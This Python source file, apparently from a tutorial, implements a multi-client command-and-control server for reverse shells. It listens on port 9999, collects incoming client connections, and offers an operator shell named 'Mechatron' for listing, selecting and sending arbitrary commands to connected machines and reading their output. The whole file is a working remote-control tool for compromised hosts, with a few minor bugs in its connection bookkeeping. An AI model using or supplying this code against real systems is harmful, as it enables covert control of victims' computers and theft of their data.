import socket
import sys
import threading
import queue
'''First i need to create a thread that can preform two actions(listen&acceptingconnections,sending commands)'''
number_of_jobs=2; #the number of actions i want to carry out
job_to_do=[1,2]; #(1) is for listen and accept while (2) is for sending commands
queue=queue.Queue();
all_connections=[]; #python list declration for storing connections
all_addresses=[]; #python list declration for storing addresses



#create the socket object
def create_socket():
    global s
    global port
    global host

    s=socket.socket(); #create a socket object
    port=9999; #port number
    host=''; #ip address of the system


#bind address to one end of the socket and listen for connections
def bind_socket():
    print('Binding port number :> '+str(port));
    s.bind((host,port)); #bind the address to the end of the socket
    s.listen(5); #listen for connections


'''Here we accept connections from the client and also close connections if nthe server is been restarted'''
#delete all existing address and connections is server.py file is restarted

def accept_connections():
    #here we delete connections if server is restarted
    for c in all_connections:
        c.close(); #close all connections if server is restarted
    del all_addresses[:];  #delete all address
    del all_connections[:]; #delete all connections

    while True:
        conn,address=s.accept(); #accept connection from client
        s.setblocking(1); #prevent connection timeout
        all_connections.append(conn); #append conn to list
        all_addresses.append(address); #append address to list

        print('Connections established :> '+str(address[0]));


'''
We want to create a custom interactive shell named turtle that does thesecond thread functions
1)list all connections 2)select from various client 3)send commands

'''
def start_mechatron():
    while True:
        cmd = input('Mechatron:>');  # get user input
        if cmd=='list':
            list_connections(); #function call
        elif 'select' in cmd:
            conn=get_target(cmd); #function call to get selected client connection
            if conn is not None: #if connection is not false
                send_command_to_the_selected_user(conn); #function call to send commands to selected user
        else:
            print('Command is not recognized');

#This is where we list all active connections and delete in-active connections

def list_connections():
    results=' '; #this is where we store all id,address and port of a client
    for i,conn in enumerate(all_connections): #check for dead connections
        try:
            conn.send(str.encode('network testing')); #send byte format to remote system
            conn.recv(20000); #recieve message from client
            #if the client is in-active it then moves to th except action
        except:
            del all_connections[i]; #delete the connections
            del all_addresses[i]; #delete the in active address
            continue
        results=str(i)+'     '+str(all_addresses[i][0]+'    '+str(all_addresses[i][1]));
        print('-------Clients-------'+'\n'+results); #show this to the server when list_connections function is called
        #e.g
        #-------Clients-------
        #1  192.334.344  9999
        #2  123.345.567  8888

def get_target(cmd): #function definition
    '''Here we are going to replace select with and emty string and return the selected connection'''
    try:
        target = cmd.replace('select',' ');  # replace the select word with empty string leaving only the number
        id=int(target); #convert to integer
        conn = all_connections[id];  # slice for the selected connection
        print('You are connected to :' + str(all_addresses[id][0]));
        print(str(all_addresses[id][0]) + '::>', end='');
        return conn;
    except:
        print('Selection is invalid ');
        return None;

def send_command_to_the_selected_user(conn): #function definition
    while True:
        cmd=input(''); #get user input
        if cmd=='quit':
            conn.close(); #close connections
            s.close(); #close socket
            sys.exit() #exit cmd
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd)); #send encoded command to the client
            client_response=conn.recv(20000).decode('utf-8'); #get client output
            print(client_response,end=''); #show client response

#create workers

def create_workers():
    for _ in range(number_of_jobs):
        t=threading.Thread(target=work); #create a thread object
        t.daemon=True; #tells the thread to end when the program ends
        t.start(); #start thread



def work():
    while True:
        x=queue.get(); #get value in queue
        if x==1:
            create_socket(); #function call
            bind_socket(); #function call
            accept_connections(); #function call
        if x==2:
            start_mechatron(); #function call to start shell
        queue.task_done(); #end queue


# create jobs for workers
def create_jobs():
    for x in job_to_do:
        queue.put(x); #add the value in list to the queue
    queue.join(); #join the values together



if __name__=='__main__':
    create_workers();
    create_jobs();


